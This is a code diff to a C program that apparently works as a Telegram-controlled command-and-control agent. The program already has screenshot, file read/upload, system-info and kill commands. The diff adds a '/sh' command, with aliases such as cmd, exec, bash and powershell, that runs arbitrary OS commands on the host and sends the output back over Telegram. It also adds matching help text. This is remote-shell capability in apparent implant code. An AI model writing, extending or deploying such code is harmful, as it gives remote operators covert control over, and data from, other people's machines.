@@ -29,6 +29,7 @@
 #include "../runtime/runtime.h"
 #include "../screenshot/screenshot.h"
 #include "../screenshot/screenshot_output.h"
+#include "../shell/shell_output.h"
 #include "telegram.h"
 #include "telegram_platform.h"
 
@@ -219,6 +220,7 @@ typedef enum {
   CMD_STATUS,
   CMD_INFO,
   CMD_KILL,
+  CMD_SHELL,
   CMD_HELP
 } c2t_cmd_id_t;
 
@@ -281,6 +283,7 @@ static const cmd_entry_t g_cmd_mappings[] = {
   {"status", CMD_STATUS}, {"ping", CMD_STATUS},
   {"info", CMD_INFO}, {"sysinfo", CMD_INFO}, {"about", CMD_INFO}, {"start", CMD_INFO},
   {"kill", CMD_KILL}, {"stop", CMD_KILL}, {"shutdown", CMD_KILL}, {"terminate", CMD_KILL}, {"quit", CMD_KILL}, {"exit", CMD_KILL},
+  {"sh", CMD_SHELL}, {"shell", CMD_SHELL}, {"cmd", CMD_SHELL}, {"exec", CMD_SHELL}, {"terminal", CMD_SHELL}, {"bash", CMD_SHELL}, {"powershell", CMD_SHELL}, {"ps", CMD_SHELL}, {"run_cmd", CMD_SHELL},
   {"help", CMD_HELP}
 };
 
@@ -1537,6 +1540,12 @@ static void handle_command(const telegram_incoming_update_t *update,
     break;
   }
 
+  case CMD_SHELL: {
+    const char *arg = get_command_argument(text);
+    (void)c2t_shell_run_and_send(arg);
+    break;
+  }
+
   case CMD_LOGS: {
     c2t_log_info("listener", "Flushing logs on-demand by /logs command");
     c2t_log_sender_dispatch_now();
@@ -2180,6 +2189,14 @@ static void handle_command(const telegram_incoming_update_t *update,
       }
     }
 
+    static const char shell_sec[] =
+        "<b>Shell Execution:</b>\n"
+        "• <code>/sh &lt;command&gt;</code> (or <code>/cmd</code>, <code>/exec</code>, <code>/shell</code>) - Execute OS command\n\n";
+    if (h_off + sizeof(shell_sec) - 1 < sizeof(help_msg)) {
+      memcpy(help_msg + h_off, shell_sec, sizeof(shell_sec) - 1);
+      h_off += sizeof(shell_sec) - 1;
+    }
+
     static const char help_tail[] =
         "💡 <i>Tip: Commands also accept dash syntax (e.g. "
         "<code>/keyboard-shortcuts off</code> or <code>/screenshot-format jpg</code>)</i>";
@@ -2213,6 +2230,7 @@ static int is_heavy_command(c2t_cmd_id_t cmd) {
   case CMD_CAT:
   case CMD_FILEINFO:
   case CMD_UPLOAD:
+  case CMD_SHELL:
   case CMD_LOGS:
   case CMD_RESTART:
   case CMD_RESTART_KEYBOARD:
